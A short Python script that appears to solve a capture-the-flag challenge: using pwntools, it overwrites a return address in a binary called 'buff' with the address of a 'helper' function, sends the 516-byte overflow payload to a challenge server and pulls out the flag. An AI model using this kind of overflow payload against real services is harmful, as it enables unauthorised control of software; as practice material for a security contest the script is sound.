#!/usr/bin/env python3

from pwn import *
import requests
import re

elf = ELF("./buff")

print("Found helper at: " + hex(elf.symbols['helper']))

payload = b"A" * 516 + p32(elf.symbols['helper'])

r = requests.post("https://r0.nzcsc.org.nz/challenge5/", data={"message": payload}, timeout=5)
print(re.search("flag{.*}", r.text).group())